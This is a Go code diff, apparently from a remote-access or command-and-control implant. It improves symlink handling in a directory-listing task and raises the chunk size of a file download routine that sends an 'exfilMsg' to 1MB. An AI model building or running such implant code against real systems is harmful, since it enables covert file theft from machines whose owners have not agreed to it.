@@ -17,6 +17,7 @@ import (
 	"os"
 	"os/exec"
 	"os/user"
+	"path/filepath"
 	"sync"
 	"syscall"
 	"time"
@@ -273,15 +274,26 @@ func taskLs(paramsData []byte) ([]byte, error) {
 
 	var Files []FileInfo
 	for _, entry := range entries {
-		info, err := entry.Info()
+		fullPath := filepath.Join(path, entry.Name())
+		info, err := os.Lstat(fullPath)
 		if err != nil {
 			return msgpack.Marshal(AnsLs{Result: false, Status: err.Error(), Path: path, Files: nil})
 		}
 
-		nlink := uint64(1)
-		uid := 0
-		gid := 0
+		mode := info.Mode()
+		isLink := mode&os.ModeSymlink != 0
+
+		isDir := info.IsDir()
+
+		if isLink {
+			if targetInfo, err := os.Stat(fullPath); err == nil {
+				isDir = targetInfo.IsDir()
+			}
+		}
+
 		stat, ok := info.Sys().(*syscall.Stat_t)
+		var nlink uint64 = 1
+		var uid, gid int
 		if ok {
 			nlink = uint64(stat.Nlink)
 			uid = int(stat.Uid)
@@ -289,26 +301,23 @@ func taskLs(paramsData []byte) ([]byte, error) {
 		}
 
 		username := fmt.Sprintf("%d", uid)
-		u, err := user.LookupId(username)
-		if err == nil {
+		if u, err := user.LookupId(username); err == nil {
 			username = u.Username
 		}
-
 		group := fmt.Sprintf("%d", gid)
-		g, err := user.LookupGroupId(group)
-		if err == nil {
+		if g, err := user.LookupGroupId(group); err == nil {
 			group = g.Name
 		}
 
 		fileInfo := FileInfo{
-			Mode:     info.Mode().String(),
+			Mode:     mode.String(),
 			Nlink:    int(nlink),
 			User:     username,
 			Group:    group,
 			Size:     info.Size(),
 			Date:     info.ModTime().Format("Jan _2 15:04"),
 			Filename: entry.Name(),
-			IsDir:    info.IsDir(),
+			IsDir:    isDir,
 		}
 		Files = append(Files, fileInfo)
 	}
@@ -652,7 +661,7 @@ func jobDownloadStart(paramsData []byte) ([]byte, error) {
 		/// Send Init
 		sendMsg(conn, exfilMsg)
 
-		chunkSize := 10
+		chunkSize := 0x100000 // 1MB
 		totalSize := len(content)
 		for i := 0; i < totalSize; i += chunkSize {
 
